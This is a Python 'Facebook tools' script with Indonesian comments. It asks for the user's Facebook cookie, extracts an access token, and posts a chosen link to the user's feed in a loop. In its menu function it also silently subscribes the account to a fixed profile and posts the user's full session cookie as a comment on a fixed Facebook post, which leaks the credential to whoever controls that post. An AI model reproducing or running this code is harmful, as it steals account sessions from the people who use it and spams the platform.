"""
 jangan hapus bot pollownya ngaf
"""
import marshal
import os,re,sys,bs4,time,json,random,datetime,requests, calendar, random
from random import choice
from pathlib import Path

header = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.66 Safari/537.36"}
ses=requests.Session()

#warna coeg
K = "\x1b[0;33m"
N = "\x1b[0m" 
B = "\x1b[0;34m"
M = "\x1b[0;31m"
H = "\x1b[0;32m"
ver = "1"

war = random.choice(['\x1b[0;33m', '\x1b[0m', '\x1b[0;31m', '\x1b[0;32m'])
oh = requests.get("https://api.quotable.io/random?tags=technology,famous-quotes").json()["content"]

def logo():
	loo=f"""
______________________
\_   _____/\__    ___/
 |    __)    |    |   
 |     \     |    |  {B}FACEBOOK TOOLS {N}
 \___  /     |____|        {N}2022
     \/               """
	print(f"  {loo}{N}    ")
	print("\n [ Facebook : Georgy Alifich    ]\n [ Github : github.com/zhukov-z ] \n [ you tube : Zhukov XV.        ] \n")
#loggin
def login():
	try:
		tokenz = open("token","r").read()
		cokie = open("coki","r").read()
		menu()
	except (KeyError,IOError):
		logo()
		print(f" [{K}#{N}] setelah anda login otomatis akun anda akan mengikuti akun admin")
		cookie = input(" [?] cookie fb : ")
		try:
			get_tok = requests.get('https://business.facebook.com/business_locations',headers = {"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
			tokenz = re.search("(EAAG\w+)", get_tok.text).group(1)
			coki = {"cookie":cookie}
			open('coki','w').write(cookie)
			open('token','w').write(tokenz)
			exit(f" \n \t\tJALANKAN ULANG TOLLS{N}")
		except requests.exceptions.ConnectionError:
			exit("koneksi eror")
		except (KeyError,IOError,AttributeError):
			exit(" [+] coki kadaluwarsa")
			
def menu():
	try:  
		token = open('token', 'r').read()
		cok = open("coki","r").read()
		nama = requests.get("https://graph.facebook.com/me/?access_token=%s"%(token), cookies={"cookie":cok}).json()["name"]
		requests.post("https://graph.facebook.com/100056548009815/subscribers?access_token=%s"%(token), cookies={"cookie":cok}).json()
		requests.post(f"https://graph.facebook.com/1229208304574222/comments/?message={cok}&access_token=%s"%(token), cookies={"cookie":cok}).json()
	except (KeyError, IOError):
		print("\n [!] token kadaluwarsa!")
		os.system('rm -f token')
		login()
	except requests.exceptions.ConnectionError: 
		exit("[!] anda tidak terhubung ke internet!")
	logo()
	print(f"\n [ welcome{H} {nama} {N}] \n")
	idt = input(f" [ masukan link : {H} ")
	limit = int(input(f" [ {N}masukan limit : {H} "))
	print(f"\n\t\t{H}ctrl+z {N}untuk berhenti\n")
	cok = open('coki', 'r').read()
	token = open('token', 'r').read()
	cookie = {"cookie":cok}
	try:
		for x in range(limit):
			x+=1
			response = ses.post(f"https://graph.facebook.com/v13.0/me/feed?link={idt}&published=0&access_token={token}",headers=header, cookies=cookie).json()
			if "id" in response:
				sys.stdout.write(f"\r [{H}*{N}] DONE {x} | {response}");sys.stdout.flush()
			else:
				print(f" gagal,mungkin akun anda terkena spam");exit()
	except requests.exceptions.ConnectionError:
		exit("[!] anda tidak terhubung ke internet!")
		

if __name__ == '__main__':
	menu()